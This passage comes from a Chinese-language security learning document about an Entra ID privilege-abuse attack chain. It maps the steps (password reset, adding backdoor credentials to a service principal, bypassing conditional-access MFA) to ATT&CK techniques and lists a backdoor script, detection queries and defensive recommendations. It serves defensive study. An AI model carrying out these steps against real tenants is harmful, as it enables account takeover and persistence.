│  │  └── T1550.001 - Application Level Authentication                 │
│  │      • 步骤 5: 绕过条件访问策略的 MFA 要求                          │
│  │                                                                     │
│  TA0001 - Initial Access                                              │
│  │                                                                     │
│  │  └── T1078.004 - Valid Accounts: Cloud Accounts                    │
│  │      • 步骤 1: 重置用户密码                                        │
│  │                                                                     │
│  TA0003 - Persistence                                                 │
│  │                                                                     │
│  │  └── T1098.001 - Account Manipulation: Additional Cloud Creds      │
│  │      • 步骤 2: 添加服务主体后门凭据                                │
│  │                                                                     │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 参考资料

### 项目相关文档

| 文件 | 描述 | 位置 |
|------|------|------|
| **README.md** | 项目概述和章节导航 | [README.md](README.md) |
| **LateralMovementADEID.md** | 防止从 AD 到 Entra ID 的横向移动 | [LateralMovementADEID.md](LateralMovementADEID.md) |
| **ServicePrincipals-ADO.md** | Azure DevOps 中的服务主体安全 | [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) |
| **PasswordSpray.md** | 密码喷射攻击和检测 | [PasswordSpray.md](PasswordSpray.md) |
| **ConsentGrant.md** | 同意授予攻击和 OAuth 钓鱼 | [ConsentGrant.md](ConsentGrant.md) |

### 脚本和工具

| 文件 | 描述 | 位置 |
|------|------|------|
| **Invoke-EntraConnectAppAuthBackdoor.ps1** | Entra Connect 应用后门脚本 | [scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1](scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1) |

### KQL 查询

| 文件 | 描述 | 位置 |
|------|------|------|
| **MDA-Hunt-Multi-Stage-Incident.kql** | 多阶段攻击关联查询 | [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql) |
| **AADConnectorAccount-AddedTAPorChangedPassword.kql** | 密码变更检测 | [queries/AADConnectorAccount-AddedTAPorChangedPassword.kql](queries/AADConnectorAccount-AddedTAPorChangedPassword.kql) |

### 配置文件

| 文件 | 描述 | 位置 |
|------|------|------|
| **Policy-change-detected.json** | 策略变更检测规则模板 | [config/ruletemplates/Policy-change-detected.json](config/ruletemplates/Policy-change-detected.json) |
| **AadSecConfigV3.json** | Entra ID 安全配置 | [config/AadSecConfigV3.json](config/AadSecConfigV3.json) |

### 官方文档

| 主题 | 链接 |
|------|------|
| **管理单元** | [Administrative units in Microsoft Entra ID](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units) |
| **组所有权** | [Manage owners for a group](https://learn.microsoft.com/en-us/entra/fundamentals/users-groups-manage-owners) |
| **条件访问策略** | [Conditional Access: Target resources](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-cloud-apps) |
| **What If 工具** | [Troubleshooting Conditional Access using the What If tool](https://learn.microsoft.com/en-us/entra/identity/conditional-access/what-if-tool) |
| **条件访问授权控制** | [Conditional Access: Grant controls](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-grant) |

### 社区资源

| 主题 | 链接 |
|------|------|
| **EntraOps 模块** | [https://www.cloud-architekt.net/entraops/](https://www.cloud-architekt.net/entraops/) |
| **AADInternals** | [https://aadinternals.com/](https://aadinternals.com/) |
| **项目 GitHub** | [https://github.com/Cloud-Architekt/AzureAD-Attack-Defense](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense) |

---

## 总结

本学习目标展示了 Microsoft Entra ID 环境中一个完整的特权滥用攻击链。通过理解以下关键概念，组织可以更好地保护其身份基础设施：

### 关键要点

1. **管理单元限制**：虽然管理单元提供了权限隔离，但不当配置可能导致权限提升
2. **应用程序管理员权限**：Application Administrator 角色可以管理所有应用程序的凭据，需要谨慎授予
3. **组所有权**：组的所有者可以管理成员，即使没有管理员角色
4. **条件访问策略**：排除项可能创建安全漏洞，需要仔细审查
5. **检测和响应**：综合使用审计日志、Microsoft Sentinel 和 Defender for Cloud Apps 来检测攻击

### 防御建议

1. **实施最小权限原则**：定期审查角色和权限分配
2. **加固条件访问策略**：移除不必要的排除项，实施多重控制
3. **使用托管标识**：优先使用托管标识而非服务主体
4. **配置监控和告警**：实时监控可疑活动
5. **定期安全审查**：使用 Entra ID Security Config Analyzer 等工具

---

**文档版本：** 1.0
**最后更新：** 2025-01-13
**基于：** AzureAD-Attack-Defense-frame 项目 (https://github.com/Cloud-Architekt/AzureAD-Attack-Defense)
